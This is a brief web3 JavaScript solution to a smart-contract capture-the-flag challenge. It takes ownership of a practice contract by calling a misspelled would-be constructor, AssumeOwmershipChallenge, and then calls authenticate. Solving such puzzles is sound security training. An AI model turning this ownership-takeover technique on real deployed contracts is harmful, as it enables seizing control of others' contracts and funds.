challenge_contract_address = "0x67575FEA4444d67E0966888a4Fe1358A149F82C1"
player = "0x164f58B4CdDd3D5fD430BeA9aA22D804157b8d44"

abi = [{"constant":false,"inputs":[],"name":"AssumeOwmershipChallenge","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"authenticate","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"isComplete","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"}]
contract = new web3.eth.Contract(abi, challenge_contract_address)

await contract.methods.AssumeOwmershipChallenge().send({"from": player}); // A simple typo error allows anyone to call the function that ought to be the contract's constructor.
await contract.methods.authenticate().send({"from":player})